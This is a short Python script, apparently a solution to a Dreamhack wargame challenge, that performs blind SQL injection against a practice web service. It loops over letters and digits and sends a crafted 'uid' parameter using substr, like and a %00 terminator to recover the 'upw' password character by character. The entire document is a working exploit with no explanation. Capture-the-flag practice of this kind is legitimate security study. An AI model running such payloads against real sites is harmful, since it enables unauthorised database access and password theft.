import requests
from string import ascii_letters, digits

a = ascii_letters + digits

url = "http://host8.dreamhack.games:8825/"
num = 0
ch =''
while True:
    num += 1
    for i in a:
        param = {"uid":"'||substr(upw,"+str(num)+",1)like('"+str(i)+"');%00"}
        req = requests.get(url,params=param)
        if "admin" in req.text:
            ch += i
            print(ch)
            break